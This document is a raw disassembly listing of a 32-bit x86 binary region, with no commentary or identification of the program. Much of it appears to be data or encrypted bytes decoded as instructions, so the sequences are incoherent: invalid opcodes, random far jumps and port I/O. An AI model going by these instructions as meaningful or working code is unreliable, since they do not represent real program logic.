  413cf2:	add    BYTE PTR fs:[ebx+0x0],dh
  413cf6:	imul   eax,DWORD PTR [eax],0x6a
  413cf9:	add    BYTE PTR [esi+0x0],ah
  413cfc:	imul   eax,DWORD PTR [eax],0x64
  413cff:	add    BYTE PTR [ebx+0x0],dh
  413d02:	add    BYTE PTR [eax],al
  413d04:	dec    edx
  413d05:	inc    esp
  413d06:	dec    ebx
  413d07:	dec    edx
  413d08:	push   0x6b
  413d0a:	fs dec ebx
  413d0c:	dec    esp
  413d0d:	dec    edx
  413d0e:	imul   ebp,DWORD PTR fs:[edx+ecx*2+0x6c],0x4c6a646b
  413d17:	push   ebp
  413d18:	inc    esp
  413d19:	outs   dx,DWORD PTR ds:[esi]
  413d1a:	imul   ebp,DWORD PTR [ebx+esi*2+0x6a],0x6a6b6b64
  413d22:	data16 fs jae 0x413d91
  413d26:	push   0x66
  413d28:	imul   esp,DWORD PTR [ebx+esi*2+0x0],0x0
  413d2d:	add    BYTE PTR [eax],al
  413d2f:	add    BYTE PTR [eax],al
  413d31:	add    BYTE PTR [eax],al
  413d33:	add    BYTE PTR [ebp-0x68],cl
  413d36:	inc    eax
  413d37:	add    BYTE PTR [ebp+0x4f],dl
  413d3a:	pop    edi
  413d3b:	dec    edi
  413d3c:	dec    esp
  413d3d:	dec    edi
  413d3e:	push   eax
  413d3f:	dec    edi
  413d40:	pop    edi
  413d41:	dec    edi
  413d42:	push   esi
  413d43:	dec    edi
  413d44:	or     eax,0xc24f0c4f
  413d49:	dec    esi
  413d4a:	add    BYTE PTR [eax],al
  413d4c:	pop    ecx
  413d4d:	dec    edi
  413d4e:	pop    esi
  413d4f:	dec    edi
  413d50:	pop    ebx
  413d51:	dec    edi
  413d52:	or     eax,0xc24f0c4f
  413d57:	dec    esi
  413d58:	dec    edi
  413d59:	dec    edi
  413d5a:	dec    ebp
  413d5b:	dec    edi
  413d5c:	pop    edi
  413d5d:	dec    edi
  413d5e:	dec    esp
  413d5f:	dec    edi
  413d60:	or     eax,0xc24f0c4f
  413d65:	dec    esi
  413d66:	add    BYTE PTR [eax],al
  413d68:	dec    ebp
  413d69:	dec    edi
  413d6a:	pop    edx
  413d6b:	dec    edi
  413d6c:	push   esi
  413d6d:	dec    edi
  413d6e:	dec    ecx
  413d6f:	dec    edi
  413d70:	arpl   WORD PTR [edi+0x52],cx
  413d73:	dec    edi
  413d74:	pop    ebx
  413d75:	dec    edi
  413d76:	ret    0x4e
  413d79:	add    BYTE PTR [eax],al
  413d7b:	add    BYTE PTR [esi+0x7d],ch
  413d7e:	outs   dx,BYTE PTR ds:[esi]
  413d7f:	lea    ebp,[esi-0x63]
  413d82:	outs   dx,BYTE PTR ds:[esi]
  413d83:	lods   eax,DWORD PTR ds:[esi]
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    ebp,0xdd6ecd6e
  413d8a:	outs   dx,BYTE PTR ds:[esi]
  413d8b:	in     eax,dx
  413d8c:	outs   dx,BYTE PTR ds:[esi]
  413d8d:	std    
  413d8e:	outs   dx,BYTE PTR ds:[esi]
  413d8f:	or     eax,0x2d6e1d6e
  413d94:	outs   dx,BYTE PTR ds:[esi]
  413d95:	cmp    eax,0x6d6e5d6e
  413d9a:	outs   dx,BYTE PTR ds:[esi]
  413d9b:	jb     0x413e0b
  413d9d:	jae    0x413e0d
  413d9f:	jo     0x413e0f
  413da1:	jno    0x413e11
  413da3:	jbe    0x413e13
  413da5:	ja     0x413e15
  413da7:	je     0x413e17
  413da9:	jne    0x413e19
  413dab:	mov    ch,BYTE PTR [esi-0x75]
  413dae:	outs   dx,BYTE PTR ds:[esi]
  413daf:	mov    BYTE PTR [esi-0x77],ch
  413db2:	outs   dx,BYTE PTR ds:[esi]
  413db3:	mov    gs,WORD PTR [esi+0x7c]
  413db6:	pop    esi
  413db7:	jge    0x413e07
  413db9:	jge    0x413d79
  413dbb:	jge    0x413e15
  413dbd:	(bad)  
  413dbe:	jns    0x413e30
  413dc0:	mov    ecx,0x7d736eb1
  413dc5:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413dcb:	add    BYTE PTR [ecx+0x17],cl
  413dce:	mov    ebx,0x4af4b956
  413dd3:	aaa    
  413dd4:	dec    edx
  413dd5:	jle    0x413d70
  413dd7:	jno    0x413e39
  413dd9:	mov    cl,0x4
  413ddb:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413de2:	inc    esp
  413de3:	xlat   BYTE PTR ds:[ebx]
  413de4:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413dea:	rcr    esi,cl
  413dec:	(bad)  
  413ded:	leave  
  413dee:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413df4:	fs icebp 
  413df6:	push   eax
  413df7:	(bad)  
  413df8:	rcr    DWORD PTR [eax],1
  413dfa:	shl    DWORD PTR [ecx+0x0],1
  413dfd:	add    BYTE PTR [eax],al
  413dff:	add    bh,ch
  413e01:	(bad)  [ebx+0x7]
  413e04:	or     BYTE PTR [ecx+eax*2],bh
  413e07:	add    BYTE PTR [esi+0x30],al
  413e0a:	shl    DWORD PTR [ebx],0x38
  413e0d:	and    eax,DWORD PTR [ecx+0x0]
  413e10:	inc    esi
  413e11:	push   ebx
  413e12:	outs   dx,DWORD PTR ds:[esi]
  413e13:	push   ebx
  413e14:	mov    al,ds:0x400413b
  413e19:	cmp    al,0x41
  413e1b:	add    BYTE PTR [edi+0x712ed],cl
	...
  413e3d:	add    BYTE PTR [eax],al
  413e3f:	add    BYTE PTR [edi+0x78],dl
  413e42:	popa   
  413e43:	push   edi
  413e44:	push   esi
  413e45:	push   esp
  413e46:	dec    eax
  413e47:	je     0x413e95
  413e49:	push   ebx
  413e4a:	jne    0x413eb7
  413e4c:	popa   
  413e4d:	jns    0x413e94
  413e4f:	pop    ecx
  413e50:	je     0x413e9a
  413e52:	push   ebp
  413e53:	jp     0x413eab
  413e55:	jp     0x413ed0
  413e57:	js     0x413ec9
  413e59:	imul   edx,DWORD PTR [edi+0x6d],0x48
  413e5d:	push   eax
  413e5e:	dec    eax
  413e5f:	dec    edx
  413e60:	outs   dx,BYTE PTR ds:[esi]
  413e61:	push   esp
  413e62:	pop    ecx
  413e63:	dec    edx
  413e64:	dec    ebx
  413e65:	dec    ebp
  413e66:	dec    esi
  413e67:	je     0x413e69
	...
  413e79:	add    BYTE PTR [eax],al
  413e7b:	add    BYTE PTR [ebp+0x70],ch
  413e7e:	ins    DWORD PTR es:[edi],dx
  413e7f:	push   esp
  413e80:	dec    esi
  413e81:	jne    0x413ed4
  413e83:	outs   dx,BYTE PTR ds:[esi]
  413e84:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e8b:	pop    ecx
  413e8c:	outs   dx,BYTE PTR ds:[esi]
  413e8d:	jbe    0x413f07
  413e8f:	jns    0x413f08
  413e91:	dec    ebp
  413e92:	je     0x413f0a
  413e94:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413e98:	push   esp
  413e99:	arpl   WORD PTR [ecx+0x4b],cx
  413e9c:	push   edx
  413e9d:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413ea4:	add    BYTE PTR [eax],al
  413ea6:	inc    edi
  413ea7:	jne    0x413eef
  413ea9:	push   ebx
  413eaa:	outs   dx,DWORD PTR ds:[esi]
  413eab:	push   ebx
  413eac:	inc    esi
  413ead:	inc    edi
  413eae:	push   0x66495949
  413eb3:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413eb7:	push   esi
  413eb8:	jb     0x413f22
  413eba:	add    BYTE PTR [eax],al
  413ebc:	ins    BYTE PTR es:[edi],dx
  413ebd:	jb     0x413f38
  413ebf:	inc    edi
  413ec0:	push   edi
  413ec1:	push   esi
  413ec2:	inc    edi
  413ec3:	ins    BYTE PTR es:[edi],dx
  413ec4:	inc    ecx
  413ec5:	inc    edi
  413ec6:	jae    0x413ec8
  413ec8:	dec    edi
  413ec9:	inc    ebx
  413eca:	jo     0x413f3e
  413ecc:	data16 jp 0x413f21
  413ecf:	jp     0x413f29
  413ed1:	ins    BYTE PTR es:[edi],dx
  413ed2:	je     0x413f43
  413ed4:	jns    0x413f44
  413ed6:	popa   
  413ed7:	push   esi
  413ed8:	push   ebp
  413ed9:	push   0x57564476
  413ede:	dec    edx
  413edf:	imul   edx,DWORD PTR [ebx+0x4b],0x5065
  413ee6:	inc    ecx
  413ee7:	jp     0x413f59
  413ee9:	pop    eax
  413eea:	inc    esi
  413eeb:	jae    0x413f62
  413eed:	dec    esi
  413eee:	dec    edx
  413eef:	gs push eax
  413ef1:	jne    0x413ef3
  413ef3:	add    ah,ah
  413ef5:	cmc    
  413ef6:	jnp    0x413f46
  413ef8:	jnp    0x413ec8
  413efa:	cmc    
  413efb:	call   FWORD PTR [ebx+0x61]
  413efe:	and    bh,dl
  413f00:	div    DWORD PTR [esi-0x2e23882f]
  413f06:	add    BYTE PTR [eax],al
  413f08:	add    al,0x1
  413f0a:	add    BYTE PTR [eax],al
  413f0c:	std    
  413f0d:	mov    ch,0x83
  413f0f:	pop    esi
  413f10:	mov    dh,0xa1
  413f12:	sub    eax,0x876676b9
  413f17:	dec    eax
  413f18:	pushf  
  413f19:	cmp    dl,bl
  413f1b:	int    0xae
  413f1d:	bound  esp,QWORD PTR [ebx+0x71]
  413f20:	icebp  
  413f21:	add    ah,dl
  413f23:	inc    esp
  413f24:	fbstp  TBYTE PTR ds:0x1bbe49f6
  413f2a:	jl     0x413fa1
  413f2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f2d:	shr    BYTE PTR [ebp+0x28],0xd4
  413f31:	inc    ecx
  413f32:	lock or esi,esp
  413f35:	rol    BYTE PTR [esi+ecx*2],1
  413f38:	adc    al,0xd0
  413f3a:	or     al,al
  413f3c:	stos   DWORD PTR es:[edi],eax
  413f3d:	mov    ch,0x52
  413f3f:	mov    dl,0xa5
  413f41:	inc    ebp
  413f42:	mov    ss,WORD PTR [ebp+0x6845b9f2]
  413f48:	(bad)
  413f4c:	push   0x91ff0fda
  413f51:	retf   
  413f52:	xchg   ebx,eax
  413f53:	mov    edi,0xde782e63
  413f58:	rol    BYTE PTR [ecx+0x2bf7349d],0x6a
  413f5f:	bound  esi,QWORD PTR [ebx]
  413f61:	pop    ecx
  413f62:	cdq    
  413f63:	je     0x22873c75
  413f69:	xor    DWORD PTR [eax+edx*4+0x61],ebp
  413f6d:	popa   
  413f6e:	sahf   
  413f6f:	cmp    dh,BYTE PTR [esi+edi*2-0x4a9c8b87]
  413f76:	pop    ebx
  413f77:	pushf  
  413f78:	jl     0x413f51
  413f7a:	dec    ecx
  413f7b:	mov    ds:0xcbfe85ab,al
  413f81:	jmp    0x413f90
  413f83:	dec    esi
  413f84:	or     eax,0x5a3f0158
  413f89:	fidiv  WORD PTR [edi]
  413f8b:	and    ch,dh
  413f8d:	test   DWORD PTR [ebx-0x41aad7e3],edx
  413f93:	nop
  413f94:	xchg   ebx,eax
  413f95:	sbb    ebp,esp
  413f97:	xchg   DWORD PTR [edx],esp
  413f99:	xor    eax,DWORD PTR [esi-0x5c]
  413f9c:	push   cs
  413f9d:	fstp   TBYTE PTR [eax+0x12f49916]
  413fa3:	aam    0xa1
  413fa5:	aaa    
  413fa6:	cwde   
  413fa7:	jl     0x414011
  413fa9:	xchg   ebx,eax
  413faa:	int    0xfc
  413fac:	shl    BYTE PTR [ecx],cl
  413fae:	int    0x2c
  413fb0:	inc    ebx
  413fb1:	mov    ds:0x6f6f0fcc,al
  413fb6:	cmp    ecx,DWORD PTR [ecx+0xb]
  413fb9:	mov    ebp,0xf26c193b
  413fbe:	xchg   DWORD PTR [eax+0x1],edx
  413fc1:	arpl   WORD PTR [eax-0x12],sp
  413fc4:	jno    0x413fc2
  413fc6:	inc    ebp
  413fc7:	stos   DWORD PTR es:[edi],eax
  413fc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fc9:	test   eax,0x28369937
  413fce:	mov    WORD PTR [eax+0x7c5910e4],?
  413fd4:	add    BYTE PTR ds:0x1f180256,ch
  413fda:	retf   0x8a74
  413fdd:	jae    0x414005
  413fdf:	dec    edi
  413fe0:	enter  0xa54,0x6a
  413fe4:	and    esi,0xffffffc9
  413fe7:	xchg   esi,eax
  413fe8:	inc    eax
  413fe9:	sub    edi,0x7d
  413fec:	jnp    0x414055
  413fee:	sahf   
  413fef:	pop    esi
  413ff0:	(bad)  
  413ff1:	aam    0xdc
  413ff3:	fdivr  DWORD PTR [edx+0x11cfd877]
  413ff9:	mov    ds:0xbb468675,al
  413ffe:	xchg   ebx,eax
  413fff:	(bad)  
  414000:	mov    gs,WORD PTR [esi]
  414002:	mov    ah,0x2e
  414004:	jo     0x413fde
  414006:	mov    ebx,0x59c12720
  41400b:	xchg   ecx,eax
  41400c:	mov    ds:0x2928e9,eax
	...
  414071:	add    BYTE PTR [eax],al
  414073:	add    BYTE PTR [edx-0x26],bl
  414076:	push   esi
  414077:	pusha  
  414078:	(bad)  
  414079:	in     al,dx
  41407a:	jle    0x414076
  41407c:	call   0xeaf6:0xa0d52e96
  414083:	dec    esi
  414084:	loopne 0x414058
  414086:	add    BYTE PTR [eax],al
  414088:	add    al,0x1
  41408a:	add    BYTE PTR [eax],al
  41408c:	scas   al,BYTE PTR es:[edi]
  41408d:	cmp    esi,DWORD PTR [edx-0x7b]
  414090:	mov    ebx,0x28438a7d
  414095:	jg     0x414095
  414097:	scas   al,BYTE PTR es:[edi]
  414098:	pusha  
  414099:	mov    ebx,0xfd724127
  41409e:	out    0x9e,eax
  4140a0:	dec    ebx
  4140a1:	mov    edi,DWORD PTR [edx-0x5f]
  4140a4:	hlt    
  4140a5:	dec    cx
  4140a7:	sub    BYTE PTR [esp+edi*8],al
  4140aa:	fcom   DWORD PTR [ebp-0x52]
  4140ad:	push   esi
  4140ae:	aam    0xf0
  4140b0:	ss mov bh,0x2e
  4140b3:	pop    edi
  4140b4:	jl     0x414101
  4140b6:	mov    dl,0xa2
  4140b8:	arpl   WORD PTR [ecx-0x3a],cx
  4140bb:	push   ss
  4140bc:	mul    ebp
  4140be:	std    
  4140bf:	popa   
  4140c0:	dec    edi
  4140c1:	(bad)  
  4140c2:	mov    ch,BYTE PTR [eax-0x45453b5a]
  4140c8:	pop    ss
  4140c9:	pop    ecx
  4140ca:	add    ah,BYTE PTR [ebx]
  4140cc:	into   
  4140cd:	xor    al,BYTE PTR [ebp+ecx*2+0x39]
  4140d1:	inc    ebx
  4140d2:	jecxz  0x4140c8
  4140d4:	fldenv [ebp+0x13]
  4140d7:	jmp    0xe0a0cb77
  4140dc:	xchg   esi,eax
  4140dd:	mov    edi,0x7f448927
  4140e2:	mov    bl,0x37
  4140e4:	sbb    dh,bl
  4140e6:	add    bl,BYTE PTR [eax+0x630e1026]
  4140ec:	pop    eax
  4140ee:	fdivr  st,st(1)
  4140f0:	cmp    bh,BYTE PTR [ecx-0x6f4c4901]
  4140f6:	ins    DWORD PTR es:[edi],dx
  4140f7:	test   eax,0x8853e384
  4140fc:	hlt    
  4140fd:	xor    BYTE PTR [ebx-0x200e1588],al
  414103:	stos   BYTE PTR es:[edi],al
  414104:	mov    cl,0xf
  414106:	xor    BYTE PTR [ebp+0x795d078d],cl
  41410c:	xchg   edi,eax
  41410e:	dec    ebx
  41410f:	jl     0x4140fa
  414111:	int    0x16
  414113:	enter  0xa88a,0xd4
  414117:	enter  0x73a4,0xa0
  41411b:	test   BYTE PTR [ebp-0x57],0x27
  41411f:	mov    esp,0x1548052f
  414124:	and    dl,BYTE PTR [eax-0x2b]
  414127:	stos   DWORD PTR es:[edi],eax
  414128:	jo     0x41418d
  41412a:	or     al,0xb0
  41412c:	loop   0x414193
  41412e:	scas   eax,DWORD PTR es:[edi]
  41412f:	cli    
  414130:	pop    edx
  414131:	xchg   ebx,eax
  414132:	adc    al,0xb0
  414134:	ins    BYTE PTR es:[edi],dx
  414135:	or     DWORD PTR [ebx+0x42],ebp
  414138:	test   BYTE PTR [ebp-0x5f6cc6f7],bh
  41413e:	bound  edi,QWORD PTR [edi]
  414140:	mov    al,dh
  414142:	xchg   ecx,eax
  414143:	and    al,0xca
  414145:	add    dh,dl
  414147:	sbb    BYTE PTR [ebp+edx*4-0x74],dl
  41414b:	jmp    0x478e:0x690f02c0
  414152:	adc    cl,0xec
  414155:	in     al,dx
  414156:	mov    esi,0x74b99045
  41415b:	xor    BYTE PTR [ecx+ecx*2],dh
  41415e:	inc    edi
  41415f:	dec    esp
  414160:	(bad)  
  414161:	xor    al,al
  414163:	imul   ebx,DWORD PTR [ebx+0x7e24f9a5],0x3b4f4da2
  41416d:	fsubr  DWORD PTR [ecx+0x25]
  414170:	bound  ebx,QWORD PTR [ecx+edi*4]
  414173:	prefetch BYTE PTR [edx]
  414176:	gs iret 
  414178:	mov    dh,0x53
  41417a:	jge    0x41415e
  41417c:	jb     0x4141d1
  41417e:	push   es
  41417f:	sub    BYTE PTR [eax+0x4b],cl
  414182:	xchg   ebx,eax
  414183:	imul   esp,DWORD PTR [eax+edi*8+0x47],0xffffff93
  414188:	aaa    
  414189:	add    edi,DWORD PTR [ebp+0x4c5d2f2b]
  41418f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  4141f4:	add    dl,BYTE PTR [edx]
  4141f6:	add    DWORD PTR [ebx-0x4c5d4cef],esp
  4141fc:	mov    DWORD PTR [ecx+0x37],edx
  4141ff:	push   edi
  414200:	mov    ecx,0xe4f409b1
  414205:	rol    DWORD PTR [eax],cl
  414207:	add    BYTE PTR [ecx+eax*1],al
  41420a:	add    BYTE PTR [eax],al
  41420c:	sbb    esi,esi
  41420e:	mov    al,0x31
  414210:	sub    ch,BYTE PTR [eax]
  414212:	mov    al,ds:0xed46c640
  414217:	xchg   edx,eax
  414218:	mov    edx,0xa545584
  41421d:	or     al,0x20
  41421f:	sahf   
  414220:	das    
  414221:	xor    edx,DWORD PTR [edx-0x2c3ce272]
  414227:	mov    ecx,0xd0332e8d
  41422c:	inc    edi
  41422d:	or     BYTE PTR ds:0x8011522,ah
  414233:	out    dx,eax
  414234:	or     BYTE PTR [edi+0x4a],0x19
  414238:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414239:	in     eax,dx
  41423a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41423b:	popa   
  41423c:	or     al,0x37
  41423e:	jae    0x4142a0
  414240:	mov    ah,0x8
  414242:	xchg   edi,eax
  414243:	xchg   edx,eax
  414244:	out    dx,eax
  414245:	cli    
  414246:	xchg   ebp,eax
  414247:	stos   BYTE PTR es:[edi],al
  414248:	inc    edx
  414249:	loopne 0x4142be
  41424b:	repz popa 
  41424d:	leave  
  41424e:	popa   
  41424f:	lahf   
  414250:	test   eax,0xac3cfd47
  414255:	pushf  
  414256:	push   esp
  414257:	or     DWORD PTR [ebx+0x565ef267],ebx
  41425d:	mov    ebp,ecx
  41425f:	imul   ecx,DWORD PTR [esi+eiz*8+0x6a],0x28
  414264:	adc    eax,DWORD PTR [ebx+ebp*4]
  414267:	or     BYTE PTR [ebx-0x69],0x73
  41426b:	mov    ds:0x93508f36,al
  414270:	ins    BYTE PTR es:[edi],dx
  414271:	pushf  
  414272:	iret   
  414273:	ins    DWORD PTR es:[edi],dx
  414274:	and    ah,BYTE PTR [ecx+ebx*2]
  414277:	test   eax,0x65cb16d1
  41427c:	(bad)  
  41427d:	jecxz  0x414220
  41427f:	cli    
  414280:	and    eax,0xecda00de
  414285:	lds    esp,FWORD PTR [ebp-0x4b]
  414288:	in     eax,0xe7
  41428a:	adc    dh,BYTE PTR [esi]
  41428c:	xchg   ecx,eax
  41428d:	or     DWORD PTR [esi-0x4b],edi
  414290:	sti    
  414291:	stos   BYTE PTR es:[edi],al
  414292:	xchg   esp,eax
  414293:	xchg   BYTE PTR [ebx+0x10],dh
  414296:	jge    0x4142c6
  414298:	cmp    ch,BYTE PTR [edi+0x468a06c5]
  41429e:	mov    ebp,0x7c72390
  4142a3:	mov    al,ds:0xd194ddf9
  4142a8:	jl     0x414242
  4142aa:	push   ebx
  4142ab:	inc    edx
  4142ac:	aaa    
  4142ad:	fst    st(5)
  4142af:	add    esp,DWORD PTR [eax+0x2e]
  4142b2:	pop    edx
  4142b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142b4:	push   0xfffffffb
  4142b6:	scas   al,BYTE PTR es:[edi]
  4142b7:	mov    DWORD PTR [ebx-0x2e],esi
  4142ba:	popa   
  4142bb:	adc    dh,ch
  4142bd:	xlat   BYTE PTR ds:[ebx]
  4142be:	imul   ecx,DWORD PTR [ebx],0xc40b087e
  4142c4:	test   BYTE PTR [edi+eax*1+0x7785b507],0xc
  4142cc:	cwde   
  4142cd:	je     0x414306
  4142cf:	scas   eax,DWORD PTR es:[edi]
  4142d0:	aaa    
  4142d1:	jmp    0x995f:0x205f1eb6
  4142d8:	xchg   BYTE PTR [edx+0x3b4df505],ch
  4142de:	das    
  4142df:	nop
  4142e0:	retf   0x75db
  4142e3:	adc    eax,0x5f9c02eb
  4142e8:	xlat   BYTE PTR ds:[ebx]
  4142e9:	jmp    0xad0a733f
  4142ee:	(bad)  
  4142ef:	cmp    ebp,DWORD PTR [eax+edi*1-0x7e]
  4142f3:	sbb    DWORD PTR [ebp+0x295b48c],ebp
  4142f9:	jmp    0x99e9:0x8d5e0fdd
  414300:	call   0x3c65:0xe08d3276
  414307:	mov    bl,0xa6
  414309:	iret   
  41430a:	cmp    eax,0x5b610577
  41430f:	mov    edi,0x0
	...
  414374:	add    DWORD PTR [ecx-0x2122293],eax
  41437a:	mov    cl,0xdd
  41437c:	rol    DWORD PTR [ebp+0x5e],0xa1
  414380:	cmp    BYTE PTR [edx-0x3e],cl
  414383:	cdq    
  414384:	call   0x441445d
  414389:	add    DWORD PTR [eax],eax
  41438b:	add    BYTE PTR [esi-0x7],al
  41438e:	mov    al,0x72
  414390:	mov    ebx,0xbfe689b4
  414395:	cwde   
  414396:	pop    ebp
  414397:	and    al,0x0
  414399:	jb     0x414344
  41439b:	mov    edi,0xf3de5cdf
  4143a0:	pop    esp
  4143a1:	dec    eax
  4143a2:	adc    BYTE PTR [eax],0x6f
  4143a5:	fisub  DWORD PTR [edi-0x7ef1533d]
  4143ab:	sbb    BYTE PTR [ebp+0x75bdb633],0x50
  4143b2:	or     BYTE PTR [ecx+0x395e57e1],ah
  4143b8:	push   edi
  4143b9:	test   eax,0xea803801
  4143be:	ror    DWORD PTR [edx+eax*8-0x33a8e5f0],1
  4143c5:	sar    cl,0x7b
  4143c8:	mov    edx,ebx
  4143ca:	cwde   
  4143cb:	pop    ebp
  4143cc:	push   eax
  4143cd:	shl    DWORD PTR [ebx-0x75],0x9f
  4143d1:	cmp    al,0x87
  4143d3:	mov    ?,WORD PTR [eax-0x1af4c393]
  4143d9:	iret   
  4143da:	pop    ds
  4143db:	mov    bl,0x92
  4143dd:	push   ecx
  4143de:	cdq    
  4143df:	push   ebp
  4143e0:	pushw  cs
  4143e2:	lods   al,BYTE PTR ds:[esi]
  4143e3:	lods   al,BYTE PTR ds:[esi]
  4143e4:	xor    bl,BYTE PTR [eax+0x8b7283e]
  4143ea:	jns    0x414407
  4143ec:	inc    eax
  4143ed:	mov    ?,ebx
  4143ef:	mov    dh,0xfe
  4143f1:	mov    ebp,eax
  4143f3:	adc    ah,dl
  4143f5:	push   ecx
  4143f6:	sbb    eax,0x71e8c23e
  4143fb:	(bad)  
  4143fc:	out    dx,al
  4143fd:	or     dl,ch
  4143ff:	scas   eax,DWORD PTR es:[edi]
  414400:	cli    
  414401:	(bad)  
  414402:	inc    ebx
  414403:	ja     0x4143a5
  414405:	inc    esp
  414406:	iret   
  414407:	pop    ss
  414408:	ficomp WORD PTR fs:[ebp-0x7d]
  41440c:	dec    ebx
  41440d:	push   ss
  41440e:	and    eax,0x7e5ada1b
  414413:	int    0x2a
  414415:	push   0x86c1318a
  41441a:	cmp    eax,0xc603dac0
  41441f:	and    eax,0x4d908edf
  414424:	mov    dh,0xf3
  414426:	sub    al,0x16
  414428:	xchg   ebx,eax
  414429:	loope  0x4143f7
  41442b:	(bad)  
  41442c:	jne    0x4143c3
  41442e:	jmp    0x41440b
  414430:	aas    
  414431:	outs   dx,DWORD PTR ds:[esi]
  414432:	cli    
  414433:	jo     0x41448d
  414435:	in     al,dx
  414436:	pushf  
  414437:	xchg   ecx,eax
  414438:	adc    eax,0xff50f572
  41443d:	repnz xchg ebx,eax
  41443f:	(bad)  
  414440:	cwde   
  414441:	cld    
  414442:	add    al,BYTE PTR [edi]
  414444:	cmp    eax,DWORD PTR [ebp+eiz*2+0x31219dbd]
  41444b:	pop    edx
  41444c:	xchg   esp,eax
  41444d:	lock test DWORD PTR [ebp-0x41],0x1637e1ff
  414455:	inc    BYTE PTR [edx-0x17]
  414458:	sub    eax,0x435fe0a3
  41445d:	cmp    eax,0xf5fc0b08
  414462:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414463:	xchg   ecx,eax
  414464:	jmp    0xdcc34928
  414469:	push   esp
  41446a:	cli    
  41446b:	test   DWORD PTR [ebp-0x17f219a7],ecx
  414471:	lods   al,BYTE PTR ds:[esi]
  414472:	sbb    al,0x7e
  414474:	repz add DWORD PTR [edi+0x2340a38f],eax
  41447b:	repz pop esp
  41447d:	sbb    al,0x3b
  41447f:	dec    eax
  414480:	jg     0x41442a
  414482:	pop    DWORD PTR [ebx-0x28f20cec]
  414488:	sahf   
  414489:	pop    ds
  41448a:	mov    ebp,0x6474aba2
  41448f:	fld    QWORD PTR [eax]
	...
  4144f1:	add    BYTE PTR [eax],al
  4144f3:	add    BYTE PTR [ebx+0x73],bl
  4144f6:	inc    edx
  4144f7:	or     eax,0x775f3d6a
  4144fc:	pop    ds
  4144fd:	dec    edi
  4144fe:	or     cl,BYTE PTR [esi+0x24]
  414501:	popa   
  414502:	imul   BYTE PTR [ecx]
  414504:	in     al,dx
  414505:	aad    0x0
  414507:	add    BYTE PTR [ecx+eax*1],al
  41450a:	add    BYTE PTR [eax],al
  41450c:	or     eax,DWORD PTR [eax]
  41450e:	push   ebp
  41450f:	mov    dh,0x4d
  414511:	cmp    BYTE PTR [edx+0x221feb62],0x14
  414518:	popf   
  414519:	sub    al,0xaa
  41451b:	jnp    0x41450e
  41451d:	xchg   edx,eax
  41451e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41451f:	mov    esi,ebx
  414521:	mov    edx,0x171e072f
  414526:	pop    ebp
  414527:	adc    al,BYTE PTR [eax-0x753cae13]
  41452d:	mov    ah,0xd4
  41452f:	rol    BYTE PTR [ecx+0x4956fde4],cl
  414535:	lahf   
  414536:	and    dh,BYTE PTR ds:0xcdb8f3c4
  41453c:	in     al,0x73
  41453e:	dec    ebp
  41453f:	test   eax,0x4337ed2e
  414544:	jmp    0x25a9:0x7c17bc71
  41454b:	(bad)
  41454f:	nop
  414550:	push   edx
  414551:	scas   eax,DWORD PTR es:[edi]
  414552:	mov    eax,ds:0x6454fa85
  414557:	jmp    0x414530
  414559:	iret   
  41455a:	jo     0x4145b3
  41455c:	add    ah,bh
  41455e:	adc    eax,0x894fc3a4
  414563:	jmp    0xb991f1ec
  414568:	ss repz int3 
  41456b:	jnp    0x414517
  41456d:	adc    BYTE PTR [ecx],cl
  41456f:	(bad)  
  414570:	pop    ss
  414571:	mov    dh,0x93
  414573:	inc    ebx
  414574:	int3   
  414575:	and    al,0xb4
  414577:	pop    es
  414578:	fidiv  WORD PTR [edi]
  41457a:	push   eax
  41457b:	mov    ebx,DWORD PTR [ebx-0x6]
  41457e:	(bad)  
  41457f:	(bad)  
  414580:	fsubr  DWORD PTR [esi+0x76]
  414583:	lahf   
  414584:	jb     0x4145d9
  414586:	xchg   DWORD PTR [esi+eax*1+0x3],ebx
  41458a:	ds and al,0xbf
  41458d:	adc    al,BYTE PTR [edi]
  41458f:	out    0xd0,al
  414591:	mov    BYTE PTR [esp+edx*4+0x7b5cca06],bh
  414598:	ins    DWORD PTR es:[edi],dx
  414599:	cmp    eax,0x2b86452
  41459e:	mov    ah,0x19
  4145a0:	xchg   esi,eax
  4145a1:	mov    ecx,0x510ee8a5
  4145a6:	test   DWORD PTR [eax],esp
  4145a8:	in     al,dx
  4145a9:	lods   eax,DWORD PTR ds:[esi]
  4145aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145ab:	xchg   esp,eax
  4145ac:	add    esi,edi
  4145ae:	iret   
  4145af:	arpl   WORD PTR [ebx],bp
  4145b1:	adc    DWORD PTR [esi-0x28],ebx
  4145b4:	adc    BYTE PTR [ebx-0x47],bl
  4145b7:	je     0x41457c
  4145b9:	or     DWORD PTR [edx],ebx
  4145bb:	enter  0x8a87,0xbf
  4145bf:	xor    esi,ebp
  4145c1:	mov    ebx,0xd603f9e9
  4145c6:	pop    ecx
  4145c7:	add    BYTE PTR [ebx-0x2d],dh
  4145ca:	je     0x4145fe
  4145cc:	mov    eax,ds:0xd589594
  4145d1:	adc    edx,DWORD PTR [esi-0x439419e3]
  4145d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145d8:	push   0xb01a4a2a
  4145dd:	sub    cl,al
  4145df:	cdq    
  4145e0:	out    dx,eax
  4145e1:	test   edi,0x766f38bd
  4145e7:	fidiv  WORD PTR [ecx]
  4145e9:	daa    
  4145ea:	sbb    DWORD PTR [eax+ebx*4+0x15],ebp
  4145ee:	inc    ecx
  4145ef:	in     eax,0xa5
  4145f1:	stos   BYTE PTR es:[edi],al
  4145f2:	stc    
  4145f3:	stos   DWORD PTR es:[edi],eax
